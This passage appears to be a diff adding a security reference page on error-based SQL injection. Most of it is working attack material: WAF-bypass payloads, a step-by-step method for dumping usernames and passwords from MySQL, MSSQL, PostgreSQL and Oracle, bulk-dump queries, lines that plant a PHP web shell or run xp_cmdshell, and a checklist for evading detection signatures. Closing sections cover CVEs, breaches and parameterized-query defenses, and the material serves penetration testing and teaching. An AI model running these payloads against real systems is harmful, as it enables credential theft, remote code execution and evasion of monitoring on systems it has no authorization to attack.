+-- Bypassed AWS WAF, Cloudflare, Palo Alto, F5, Imperva (patched late 2022)
+\`\`\`
+
+#### 15. HTTP Parameter Pollution
+
+\`\`\`
+/?id=1'/*&id=*/AND/*&id=*/EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--
+-- WAF inspects each parameter individually; backend concatenates them
+\`\`\`
+
+#### 16. XML Entity Encoding (SOAP/XML Injection Points)
+
+\`\`\`xml
+<productId>&#x31;&#x27;&#x20;AND&#x20;EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--</productId>
+<productId><![CDATA[1' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--]]></productId>
+\`\`\`
+
+#### 17. Content-Type/Charset Confusion (WAFFLED, ACSAC 2025)
+
+\`\`\`
+Content-Type: application/x-www-form-urlencoded; charset=ibm037
+-- Body: IBM037-encoded payload. WAF cannot decode. Backend can.
+\`\`\`
+
+#### 18. Multipart Boundary Confusion
+
+\`\`\`
+Content-Type: multipart/form-data; boundary=----X; boundary=----Y
+-- WAF parses boundary X, backend parses boundary Y (payload in Y)
+\`\`\`
+
+#### 19. Chunked Transfer Encoding Split
+
+\`\`\`
+Transfer-Encoding: chunked
+3\\r\\nid=\\r\\n5\\r\\n1' AN\\r\\n8\\r\\nD EXTRA\\r\\n...
+-- WAF reassembles incorrectly; backend reconstructs valid payload
+\`\`\`
+
+#### 20. MSSQL-Specific WAF Bypasses
+
+\`\`\`
+%C2%85    -- non-standard whitespace (Unicode Next Line)
+%C2%A0    -- non-breaking space
+0eunion   -- scientific notation prefix confuses WAF parser
+from.users -- period as whitespace separator
+select\\Nnull -- newline escape
+\`\`\`
+
+---
+
+## Exploitation
+
+### Step-by-Step Error-Based Extraction (10 Steps)
+
+**Step 1: Identify injection point.** Submit \`'\`, \`"\`, \`1/0\`, \`AND 1=1\` to each parameter. Look for error messages or behavioral changes.
+
+**Step 2: Fingerprint the database.** Read the error message text. MySQL says "You have an error in your SQL syntax," MSSQL says "Conversion failed," PostgreSQL says "ERROR: invalid input syntax," Oracle says "ORA-" codes.
+
+**Step 3: Confirm error-based data extraction is possible.** Inject a version extraction payload appropriate for the database. If the version appears in the error, direct error extraction works.
+
+**Step 4: Extract the database name.**
+
+\`\`\`sql
+-- MySQL: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))
+-- MSSQL: AND 1=CONVERT(int,db_name())
+-- PostgreSQL: AND 1=CAST((SELECT current_database()) AS int)
+-- Oracle: AND 1=CTXSYS.DRITHSX.SN(user,(SELECT global_name FROM global_name))
+\`\`\`
+
+**Step 5: Enumerate tables.**
+
+\`\`\`sql
+-- MySQL: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))
+-- Increment LIMIT offset: LIMIT 1,1 ... LIMIT 2,1 ... etc.
+-- MSSQL: AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))
+-- PostgreSQL: AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 0) AS int)
+-- Oracle: AND 1=CTXSYS.DRITHSX.SN(user,(SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1))
+\`\`\`
+
+**Step 6: Enumerate columns of target table.**
+
+\`\`\`sql
+-- MySQL: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))
+-- MSSQL: AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))
+-- PostgreSQL: AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS int)
+\`\`\`
+
+**Step 7: Extract data from target columns.**
+
+\`\`\`sql
+-- MySQL: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e))
+-- MSSQL: AND 1=CONVERT(int,(SELECT TOP 1 username+':'+password FROM users))
+-- PostgreSQL: AND 1=CAST((SELECT username||':'||password FROM users LIMIT 1) AS int)
+\`\`\`
+
+**Step 8: Handle character limits.** For MySQL EXTRACTVALUE (32-char limit), chunk with SUBSTRING:
+
+\`\`\`sql
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM users LIMIT 0,1)))
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,32,31) FROM users LIMIT 0,1)))
+\`\`\`
+
+**Step 9: Iterate through all rows.** Increment LIMIT offset (MySQL), OFFSET (PostgreSQL), or use \`NOT IN (SELECT TOP N ...)\` (MSSQL) to extract all records.
+
+**Step 10: Validate extracted data.** Attempt login with extracted credentials. Verify completeness by checking row counts before extraction.
+
+---
+
+## Post-Exploitation
+
+### Character Limit Bypass Techniques
+
+| Function | Default Limit | Bypass Method |
+|----------|--------------|---------------|
+| EXTRACTVALUE/UPDATEXML | 32 chars | SUBSTRING(data, offset, 31) chunking |
+| FLOOR+GROUP BY | ~64 chars | SUBSTRING chunking |
+| EXP/BIGINT overflow | ~255 chars | Sufficient for most values; SUBSTRING for longer |
+| GTID_SUBSET | ~200+ chars | Sufficient for most values |
+| MSSQL CONVERT/CAST | ~8000 chars | Rarely needs chunking |
+| PostgreSQL CAST | ~256 chars | SUBSTR(data, offset, length) |
+| Oracle XMLType | ~70 chars (standard) | Base64 optimization (162B) or SUBSTR |
+
+### DIOS (Dump In One Shot)
+
+DIOS extracts multiple schema rows in a single request, bypassing the need for iterative LIMIT/OFFSET enumeration.
+
+**MySQL DIOS via BIGINT overflow:**
+
+\`\`\`sql
+AND !(SELECT*FROM(SELECT(CONCAT(@:=0,(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND @:=CONCAT(@,0x0a,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
+-- Returns up to ~27 rows of schema::table::column
+\`\`\`
+
+**MSSQL DIOS via FOR XML PATH:**
+
+\`\`\`sql
+AND 1=CAST((SELECT table_name+'::'+column_name+'|' FROM information_schema.columns FOR XML PATH('')) AS int)
+-- Returns ALL columns in the database in a single error message
+\`\`\`
+
+**PostgreSQL DIOS via query_to_xml:**
+
+\`\`\`sql
+AND 1=CAST(query_to_xml('SELECT * FROM users',true,true,'')::text AS int)
+-- Returns entire users table as XML in the error message
+\`\`\`
+
+### Chaining to RCE
+
+Error-based SQLi can chain to remote code execution if the database supports stacked queries:
+
+- **MSSQL:** \`; EXEC xp_cmdshell 'whoami'--\` (requires sysadmin role)
+- **MySQL:** \`; SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--\` (requires FILE privilege and known web root)
+- **PostgreSQL:** \`; COPY (SELECT '') TO PROGRAM 'id'--\` (requires superuser)
+
+---
+
+## Detection Evasion
+
+### WAF Bypass Strategy for Error-Based Functions
+
+**Priority order when primary error functions are blocked:**
+
+1. Try alternative error functions for the same database (see substitution table in Section 10)
+2. Use hex encoding, CHAR() functions, or version-conditional comments to obfuscate function names
+3. Use implicit type conversion (no CAST/CONVERT keyword)
+4. Use CASE WHEN + arithmetic overflow (no error function keywords at all)
+5. Use HTTP-level bypasses (double encoding, HPP, charset confusion, chunked encoding)
+6. Use XML entity encoding if the injection point is in a SOAP/XML body
+
+### IDS/WAF Detection Signatures to Avoid
+
+\`\`\`
+EXTRACTVALUE\\s*\\(        -- EXTRACTVALUE function call
+UPDATEXML\\s*\\(           -- UPDATEXML function call
+CONVERT\\s*\\(\\s*int       -- CONVERT to int
+CAST\\s*\\(.*AS\\s+int      -- CAST to int
+GTID_SUBSET\\s*\\(         -- GTID function
+EXP\\s*\\(\\s*~             -- EXP overflow pattern
+FLOOR\\s*\\(\\s*RAND        -- FLOOR+RAND pattern
+XPATH syntax error        -- MySQL error output pattern
+Conversion failed          -- MSSQL error output pattern
+invalid input syntax       -- PostgreSQL error output pattern
+\`\`\`
+
+### Payload Obfuscation Checklist
+
+- [ ] Randomize function name casing (MySQL, MSSQL, Oracle are case-insensitive)
+- [ ] Replace spaces with inline comments \`/**/\`, tabs \`%09\`, newlines \`%0a\`
+- [ ] Use hex encoding for string arguments (\`0x61646d696e\` instead of \`'admin'\`)
+- [ ] Wrap error functions inside IF(), COALESCE(), or IIF()
+- [ ] Use MySQL version-conditional comments \`/*!50000...*/\`
+- [ ] Avoid CAST/CONVERT keywords (use implicit conversion or :: operator)
+- [ ] Split payload across HTTP parameters (HPP)
+- [ ] Double URL-encode if backend decodes twice
+
+---
+
+## Variations and Edge Cases
+
+### Direct Error vs. Conditional Error: Dedicated Comparison
+
+| Property | Direct Error Extraction | Conditional Error Oracle |
+|----------|------------------------|--------------------------|
+| **Data in error message** | YES -- verbatim | NO -- inferred from error/no-error |
+| **Characters per request** | 32-8000 (function-dependent) | 1 bit (error vs. no-error) |
+| **Speed** | Fast (few requests total) | Slow (7 requests per character with binary search) |
+| **Prerequisite** | Verbose error messages visible | Any detectable error state (even generic 500) |
+| **WAF evasion difficulty** | Harder (data appears in response body) | Easier (no data in response) |
+| **Works with generic error pages** | NO -- need actual error text | YES -- only need 500 vs. 200 |
+| **Stealth** | Low (extracted data in logs/responses) | High (only HTTP status differs) |
+| **Automation complexity** | Simple regex parsing of error output | Binary search + charset iteration |
+| **MySQL functions** | EXTRACTVALUE, UPDATEXML, EXP, BIGINT, GTID_SUBSET | CASE WHEN + IF + overflow |
+| **MSSQL functions** | CONVERT, CAST, FOR XML PATH | CASE WHEN + 1/0 |
+| **Oracle functions** | XMLType, CTXSYS, UTL_INADDR | CASE WHEN + TO_CHAR(1/0) |
+| **PostgreSQL functions** | CAST(x AS int), ::int, query_to_xml | CASE WHEN + 1/(SELECT 0) |
+| **SQLite functions** | None (no direct error extraction) | load_extension, abs overflow, json('') |
+
+**When to use which:**
+
+- **Direct error**: Verbose errors visible, speed is important, EXTRACTVALUE/CAST/CONVERT not filtered
+- **Conditional error**: Error messages suppressed (generic error page), all direct functions blocked by WAF, maximum stealth needed, SQLite target
+- **Hybrid approach**: Use conditional error to confirm injection, then attempt direct error for speed; fall back to conditional if blocked
+
+### Error Functions Deprecated in Newer Versions
+
+| Function | Deprecated/Removed | Notes |
+|----------|-------------------|-------|
+| PROCEDURE ANALYSE | Deprecated MySQL 5.7.18, removed 8.0 | Useful only for LIMIT clause injection |
+| NAME_CONST | Constants only since ~5.6 | Effectively useless in modern MySQL |
+| Geometry functions (POLYGON, etc.) | Changed behavior in MySQL 5.6+ | No longer produce useful errors |
+| UTL_INADDR | ACL-restricted in Oracle 11g+ | Requires explicit ACL grant |
+
+### Custom Error Handlers That Suppress Errors
+
+Many frameworks implement custom error handling that strips database error details:
+
+- **Django** -- \`DEBUG = False\` returns generic error page; no database errors visible. But \`DEBUG = True\` returns the Yellow Debug Page with full SQL query and error.
+- **Rails** -- Production mode shows generic 500 page. Development mode shows full backtrace including SQL.
+- **Spring Boot** -- \`server.error.include-message=never\` (default since 2.3+). Older versions may include error detail.
+- **Laravel** -- \`.env APP_DEBUG=false\` suppresses details. \`APP_DEBUG=true\` shows Ignition page with SQL.
+- **Express.js** -- Default error handler shows stack trace only in \`development\` mode.
+
+**Bypass approaches:**
+1. Check if the application has a \`?debug=true\` or \`X-Debug\` header that enables verbose errors
+2. Look for error details in HTML comments, JavaScript variables, or API JSON responses
+3. Check alternative error output locations (server logs via LFI, error monitoring endpoints)
+4. Fall back to conditional error oracle (only needs behavioral difference, not error text)
+
+### JSON/API Context Error Formatting
+
+Modern APIs often return errors in structured JSON format:
+
+\`\`\`json
+{"status": "error", "code": 500, "message": "ERROR: invalid input syntax for type integer: \\"administrator\\""}
+\`\`\`
+
+Error-based extraction works identically -- the attacker reads the \`message\` field instead of parsing HTML. Some APIs truncate error messages or apply length limits that affect the number of characters extractable per request.
+
+### Framework Error Pages vs. Raw DB Errors
+
+| Source | Typical Content | Extraction Viability |
+|--------|----------------|---------------------|
+| Raw DB error (PHP \`mysqli_error()\`) | Full error with data | Direct extraction works |
+| Django debug page | Full SQL query + error + traceback | Direct extraction works (data in error) |
+| ASP.NET Yellow Screen of Death | Full stack trace with SQL details | Direct extraction works |
+| Laravel Ignition | Full SQL + bindings + solution | Direct extraction works |
+| Custom 500 page ("An error occurred") | No database detail | Conditional error only |
+| Generic JSON \`{"error": "Internal Server Error"}\` | No database detail | Conditional error only |
+
+---
+
+## Modern Stack Specifics
+
+### Cloud Database Services
+
+- **AWS RDS / Aurora** -- Error messages are standard for the database engine (MySQL, PostgreSQL, etc.). AWS WAF may block common error functions unless bypassed.
+- **Azure SQL Database** -- MSSQL errors are standard. Azure Front Door WAF applies additional filtering.
+- **Google Cloud SQL** -- Standard database errors. Cloud Armor may intercept known injection patterns.
+
+### ORM and Query Builder Behavior
+
+- **Hibernate/JPA** -- Parameterized by default, but \`createNativeQuery()\` with string concatenation is vulnerable. Error messages propagate to the caller if not caught.
+- **SQLAlchemy** -- \`text()\` with string formatting is vulnerable. \`execute()\` with bound parameters is safe.
+- **Django ORM** -- Safe by default (\`filter()\`, \`get()\` use parameterized queries). \`raw()\` and \`extra()\` with string formatting are vulnerable.
+- **ActiveRecord (Rails)** -- \`where()\` with hash/array syntax is safe. \`where("column = '#{input}'")\` with string interpolation is vulnerable.
+
+### Container/Serverless
+
+- **Docker containers** -- Error verbosity depends on the application config mounted/built into the image. Development images often have verbose errors enabled.
+- **AWS Lambda** -- Errors may appear in CloudWatch logs rather than HTTP responses. API Gateway may transform error responses.
+- **Kubernetes** -- Ingress controllers may add WAF-like filtering. Pod logs contain raw errors.
+
+---
+
+## Real-World Examples
+
+### CVEs (9 Verified)
+
+> **Note:** CVE-2025-1094 (PostgreSQL libpq string escape bypass) is documented on the [Classic / In-Band SQLi](01-Classic-In-Band.md) page -- it exploits string boundary escape, not error-based extraction.
+
+#### CVE-2024-42005 -- Django JSONField SQL Injection (CVSS 9.8)
+
+**Software:** Django 5.0 before 5.0.8, 4.2 before 4.2.15. **Technique:** SQL injection in \`QuerySet.values()\` and \`values_list()\` via crafted JSON object keys. On PostgreSQL, error-based extraction via \`CAST((SELECT password FROM auth_user LIMIT 1) AS int)\` returns "invalid input syntax for type integer: 'the_actual_password'". **Bounty:** $4,263 (HackerOne Internet Bug Bounty). [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-42005) | [HackerOne #2646493](https://hackerone.com/reports/2646493)
+
+#### CVE-2023-48788 -- Fortinet FortiClient EMS (CVSS 9.8)
+
+**Software:** FortiClient EMS 7.0.1-7.0.10, 7.2.0-7.2.2. **Technique:** SQL injection in MSSQL backend DAS component. Error-based responses revealed SQL structure. Version 7.0.x exploited via \`CONVERT()\` on hex-encoded payloads to bypass automatic uppercasing -- a classic MSSQL error-based technique. Stacked queries enabled \`xp_cmdshell\` RCE. CISA KEV listed; actively exploited from March 2024. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-48788)
+
+#### CVE-2023-34362 -- Progress MOVEit Transfer (CVSS 9.8)
+
+**Software:** All MOVEit Transfer versions before 2023.0.2. **Technique:** SQL injection in \`/human.aspx\`. NVD states attackers could "infer information about the structure and contents of the database." Exploitation chain: SQLi to extract sysadmin API tokens, then deserialization for RCE, then LEMURLOOT webshell deployment. **Scale:** 2,700+ organizations, 93.3 million individuals affected. Largest breach of 2023. Exploited by CL0P ransomware. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-34362) | [CISA Advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a)
+
+#### CVE-2024-8529 -- LearnPress WordPress Plugin (CVSS 10.0 Wordfence)
+
+**Software:** LearnPress <= 4.2.7. **Technique:** Unauthenticated injection via \`c_fields\` parameter in \`/wp-json/lp/v1/courses/archive-course\`. Ghauri confirmed error-based vectors including UPDATEXML and EXTRACTVALUE. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-8529)
+
+#### CVE-2024-21514 -- OpenCart Divido Payment Extension (CVSS 8.1)
+
+**Software:** OpenCart Divido payment extension 0.0.0-3.0.3.9. **Technique:** PoC payload: \`1 AND EXTRACTVALUE(2524,CONCAT(0x5c,0x716a7a6a71,(SELECT (ELT(2524=2524,1))),0x71716b7071))\`. Forces XPATH syntax error that leaks query output. Unauthenticated; module only needs to be installed (even if disabled). [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-21514)
+
+#### CVE-2023-6360 -- My Calendar WordPress Plugin (CVSS 9.8)
+
+**Software:** My Calendar < 3.4.22. **Technique:** Unauthenticated injection in \`from\` and \`to\` parameters within \`/my-calendar/v1/events\`. Tenable TechBlog confirmed FLOOR() error-based technique alongside boolean and time-based methods. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-6360)
+
+#### CVE-2024-2879 -- LayerSlider WordPress Plugin (CVSS 9.8 Wordfence)
+
+**Software:** LayerSlider 7.9.11 and 7.10.0. **Technique:** Unauthenticated injection via \`ls_get_popup_markup\` action through \`id[where]\` parameter. Error-based and time-based techniques confirmed. **Bounty:** $5,500 (Wordfence). [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-2879)
+
+#### CVE-2024-1071 -- Ultimate Member WordPress Plugin (CVSS 9.8)
+
+**Software:** Ultimate Member 2.1.3-2.8.2. **Technique:** Unauthenticated injection in \`sorting\` parameter when custom usermeta table is enabled. Error-based extraction on MySQL backends with verbose error reporting. 200,000+ active installations. **Bounty:** $2,063 (Wordfence). [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-1071)
+
+#### CVE-2024-23119 -- Centreon Web (CVSS 8.8)
+
+**Software:** Centreon Web multiple versions. **Technique:** Injection in \`insertGraphTemplate\` function. User-supplied string passed directly into SQL. Database error messages (including schema info) reflected to attacker. Authenticated, but escalates to RCE. Discovered by ZDI. [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-23119)
+
+### Bug Bounty Writeups (7)
+
+1. **U.S. Department of Defense** (HackerOne #227102) -- Two error-based SQLi findings. Error messages revealed C# code and internal SQL queries with table/column names. Government VDP (no monetary bounty). [Report](https://hackerone.com/reports/227102)
+
+2. **XPATH Error-Based Injection in Merchant Payment API** (Krunal Savaliya) -- UPDATEXML function used after EXTRACTVALUE was filtered by WAF. MariaDB backend. Extracted version, database name, table names. [Writeup](https://sklnhunt.github.io/posts/xpathinjectionerrorbased/)
+
+3. **Turning Blind Error-Based SQLi to Boolean -- MySQL** (Ozgur Alp) -- EXTRACTVALUE and UPDATEXML blocked by WAF. Pivoted to BIGINT overflow technique. Implemented binary search for character-by-character extraction using error/no-error as boolean oracle. [Writeup](https://ozguralp.medium.com/turning-blind-error-based-sql-injection-into-exploitable-boolean-one-part-2-mysql-ecf1dbe5352f)
+
+4. **Turning Blind Error-Based SQLi to Boolean -- MSSQL** (Ozgur Alp) -- CAST/CONVERT type conversion errors on MSSQL. When direct output was truncated, used error presence/absence as boolean oracle. [Writeup](https://ozguralp.medium.com/turning-blind-error-based-sql-injection-into-an-exploitable-boolean-one-85d6be3ca23b)
+
+5. **Error-Based SQLi with ExtractValue** (FMI Cyber Security / Bagas) -- MySQL EXTRACTVALUE for data extraction. Payload: \`extractvalue(rand(),concat(0x3a,<sql_query>))\`. Extracted version, user, table names. [Writeup](https://medium.com/fmisec/sql-injection-error-based-with-extractvalue-68ad9d809d64)
+
+6. **Django JSONField SQLi** (HackerOne #2646493) -- CVE-2024-42005. SQL injection via crafted JSON object keys in \`values()\`/\`values_list()\`. PostgreSQL error-based via CAST. $4,263 bounty. [Report](https://hackerone.com/reports/2646493)
+
+7. **Error-Based SQLi Challenges -- Bypass Techniques** (Islam Meshrif) -- Demonstrates exploitation when EXTRACTVALUE, UPDATEXML, EXP, NAME_CONST, FLOOR, UUID_TO_BIN are all blacklisted. Catalogs alternative error functions and bypass strategies. [Writeup](https://islammeshriff.medium.com/error-based-sql-injection-challenges-ed2001801117)
+
+### Conference Talks (4)
+
+1. **"Advanced SQL Injection"** -- Joe McCray, DEF CON 17. Comprehensive coverage including MSSQL CONVERT/CAST error extraction, MySQL FLOOR()/RAND() duplicate key errors. Widely cited as "one of the best SQL injection videos." [Slides](https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-joseph_mccray-adv_sql_injection.pdf)
+
+2. **"The Art of Exploiting SQL Injection"** -- Sumit "sid" Siddharth, Black Hat USA 2012. Full-day training covering error-based extraction across MySQL, MSSQL, Oracle, PostgreSQL. Co-author of "SQL Injection: Attacks and Defence" (Syngress). [Info](https://www.blackhat.com/html/bh-us-12/training/courses/bh-us-12-training_exploiting-sql-injection.html)
+
+3. **"Advanced SQL Injection in Oracle Databases"** -- Esteban Martinez Fayo, Black Hat USA 2005. Oracle-specific: PL/SQL function exploitation, error-based information disclosure through DBMS_UTILITY and built-in functions. [Slides](https://blackhat.com/presentations/bh-usa-05/bh-us-05-fayo.pdf)
+
+4. **"SQL Injection in Insert, Update and Delete Statements"** -- Osanda Malith Jayathissa, Ground Zero Summit 2016. Demonstrated UPDATEXML() and EXTRACTVALUE() in INSERT/UPDATE/DELETE contexts. Also covered MULTIPOINT(), POLYGON(), and NAME_CONST() as alternative vectors. [Paper](https://www.exploit-db.com/docs/33253)
+
+### Breaches (2)
+
+1. **MOVEit Transfer / CL0P Ransomware (2023)** -- CVE-2023-34362. SQL injection in \`/human.aspx\`. Attackers extracted sysadmin API tokens via SQL injection against MySQL/MSSQL/Azure SQL backends. 2,700+ organizations compromised. 93.3 million individuals' data exposed. Victims: British Airways, BBC, Boots, Shell, U.S. Department of Energy, Maximus (11M patient records). Largest breach of 2023. [CISA Advisory](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a)
+
+2. **TalkTalk Data Breach (2015)** -- SQL injection in three legacy web pages inherited from Tiscali acquisition. Unpatched database (fix available for 3.5 years). Verbose error messages aided reconnaissance and helped attackers refine injection queries. 156,959 customer records stolen. TalkTalk fined GBP 400,000 by ICO. [Wikipedia](https://en.wikipedia.org/wiki/2015_TalkTalk_data_breach)
+
+---
+
+## Skill Progression Path
+
+### Beginner (Weeks 1-2)
+
+1. Read PortSwigger Web Security Academy SQL injection learning path (free)
+2. Complete "Visible error-based SQL injection" lab (PRACTITIONER)
+3. Complete "Blind SQL injection with conditional errors" lab (PRACTITIONER)
+4. Practice on DVWA (Low security) -- trigger MySQL errors manually
+5. Learn to read MySQL, MSSQL, PostgreSQL error messages and identify extracted data
+
+### Intermediate (Weeks 3-4)
+
+1. Learn all MySQL error functions (EXTRACTVALUE, UPDATEXML, FLOOR+RAND, EXP, BIGINT)
+2. Learn MSSQL CAST/CONVERT and FOR XML PATH bulk extraction
+3. Practice Oracle XMLType and CTXSYS.DRITHSX.SN
+4. Master the 32-character limit bypass with SUBSTRING chunking
+5. Use sqlmap \`--technique=E\` with increasing \`--level\` and \`--risk\` values
+6. Complete SQLi-labs Lessons 5-6 (error-based specific)
+
+### Advanced (Weeks 5-8)
+
+1. Master conditional error oracle extraction (CASE WHEN + binary search)
+2. Learn WAF bypass techniques (function substitution, encoding, HPP)
+3. Study lesser-known functions: GTID_SUBSET, JSON_KEYS, UUID_TO_BIN, BIN_TO_UUID
+4. Practice geospatial function errors (ST_LatFromGeoHash, ST_GeomFromGeoJSON)
+5. Study DIOS (Dump In One Shot) techniques for bulk extraction
+6. Read real-world writeups and replicate techniques in lab environments
+
+### Expert (Ongoing)
+
+1. Develop custom sqlmap tamper scripts for WAF-protected targets
+2. Study novel techniques (JSON_TABLE, WAFFLED parsing discrepancy, charset confusion)
+3. Understand Oracle Base64-optimized XMLType for maximum extraction per request
+4. Master error-based extraction in INSERT/UPDATE/DELETE contexts
+5. Chain error-based SQLi to RCE via stacked queries
+6. Contribute to public research: discover new error functions in new database versions
+
+---
+
+## Defensive Countermeasures
+
+### Primary Defense: Parameterized Queries
+
+Parameterized queries (prepared statements) eliminate SQL injection entirely by separating code from data at the protocol level. The database receives the query structure and the data values through separate channels, making it impossible for user input to alter the query's syntax.
+
+\`\`\`java
+// VULNERABLE: String concatenation
+String query = "SELECT * FROM users WHERE id = '" + input + "'";
+
+// SECURE: Parameterized query
+PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
+stmt.setString(1, input);
+\`\`\`
+
+\`\`\`python
+# VULNERABLE: f-string interpolation
+cursor.execute(f"SELECT * FROM users WHERE id = '{user_input}'")
+
+# SECURE: Parameterized query
+cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
+\`\`\`
+
+\`\`\`php
+// VULNERABLE: Direct concatenation
+$query = "SELECT * FROM users WHERE id = '$id'";
+
+// SECURE: Prepared statement (PDO)
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->execute([$id]);
+\`\`\`
+
+### Error Message Suppression (Defense Against CWE-209)
+
+Even if SQL injection exists, error-based extraction fails without verbose errors. This is defense in depth -- it removes the error-based data channel but does not fix the underlying vulnerability.
+
+**PHP:**
+\`\`\`ini
+display_errors = Off
+log_errors = On
+error_reporting = E_ALL & ~E_NOTICE
+\`\`\`
+
+**Django:**
+\`\`\`python
+# settings.py
+DEBUG = False
+\`\`\`
+
+**ASP.NET (web.config):**
+\`\`\`xml
+<customErrors mode="On" defaultRedirect="~/Error.aspx" />
+\`\`\`
+
+**Java/Spring:**
+\`\`\`java
+// Custom error handler -- log internally, return generic message
+@ExceptionHandler(SQLException.class)
+public ResponseEntity<String> handleSqlException(SQLException e) {
+    logger.error("Database error", e);
+    return ResponseEntity.status(500).body("An internal error occurred");
+}
+\`\`\`
+
+**Express.js:**
+\`\`\`javascript
+// Production error handler -- no stack traces
+app.use((err, req, res, next) => {
+    console.error(err.stack);
+    res.status(500).json({ error: 'Internal server error' });
+});
+\`\`\`
+
+### Why Error Suppression Alone Is NOT Sufficient
+
+From CAPEC-7: "Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection." When errors are suppressed, attackers fall back to:
+
+- Boolean-based blind extraction (page content differences)
+- Time-based blind extraction (response delay)
+- Out-of-band extraction (DNS/HTTP exfiltration)
+
+Error suppression removes ONE data channel. Parameterized queries are the only complete fix.
+
+### Defense in Depth Checklist
+
+1. **Parameterized queries** -- eliminates injection entirely (primary defense)
+2. **Input validation** -- whitelist acceptable characters, reject known-bad patterns
+3. **Error message suppression** -- custom error pages, no database details in responses
+4. **Least privilege** -- database user should have minimal permissions (no FILE, no xp_cmdshell)
+5. **WAF rules** -- detect common error functions (EXTRACTVALUE, UPDATEXML, CONVERT, CAST)
+6. **Custom error pages** -- generic 500 page with no information leakage
+7. **Log monitoring** -- alert on patterns: repeated 500 errors, SQL keywords in parameters, error function names in request logs
+
+---
+
+## References
+
+### Standards and Taxonomies
+
+- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
+- [CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
+- [CAPEC-7: Blind SQL Injection](https://capec.mitre.org/data/definitions/7.html)
+- [OWASP WSTG: Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
+
+### Labs and Practice
+
+- [PortSwigger: Visible Error-Based SQL Injection Lab](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
+- [PortSwigger: Blind SQL Injection with Conditional Errors Lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+- [PortSwigger: SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+### Payload References
+
+- [PayloadsAllTheThings -- MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
+- [PayloadsAllTheThings -- PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
+- [PayloadsAllTheThings -- Oracle SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
+- [NetSPI SQL Injection Wiki -- Error Based Injection](https://sqlwiki.netspi.com/injectionTypes/errorBased/)
+- [Advanced SQL Injection Cheatsheet -- MSSQL Error Based](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/MSSQL%20-%20Error%20Based%20SQLi/README.md)
+
+### Security Research
+
+- [BIGINT Overflow Error Based SQL Injection -- Osanda Malith (2015)](https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/)
+- [MySQL Error Based SQL Injection Using EXP -- Exploit-DB](https://www.exploit-db.com/docs/english/37953-mysql-error-based-sql-injection-using-exp.pdf)
+- [Optimized Oracle Error-Based SQLi via XMLType + Base64 -- xassiz](https://gist.github.com/xassiz/7aa20b670d7e44da665c3e28f216a927)
+- [Advanced MSSQL Injection Tricks -- PT SWARM](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
+- [MySQL Injection in UPDATE, INSERT and DELETE -- Osanda Malith](https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/)
+- [Error Based SQL Injection Tricks -- Rafay Baloch](https://www.rafaybaloch.com/2017/06/error-based-sql-injection-tricks-in.html)
+- [JS-ON Security-OFF: JSON-Based SQL WAF Bypass -- Claroty Team82 (2022)](https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf)
+- [WAFFLED: Exploiting Parsing Discrepancies -- ACSAC 2025](https://arxiv.org/abs/2503.10846)
+
+### Tools
+
+- [sqlmap -- Automatic SQL Injection Tool](https://github.com/sqlmapproject/sqlmap)
